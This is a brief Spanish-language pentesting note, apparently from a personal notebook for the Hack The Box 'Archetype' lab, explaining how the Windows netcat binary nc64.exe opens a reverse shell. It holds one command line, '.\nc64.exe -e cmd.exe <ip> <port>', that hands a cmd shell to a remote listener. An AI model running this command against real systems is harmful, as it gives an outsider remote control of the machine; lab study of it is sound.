
# Linux


# Windows

## nc64.exe

Utilizando el binario de netcat para windows x64 podemos mandarnos una reverse shell. Se utiliza en [[Archetype HTB]].

```powershell
.\nc64.exe -e cmd.exe <ip> <port>
```

Con el parámetro `-e` indicamos que queremos ejecutar un archivo al conectarnos, en este caso una cmd.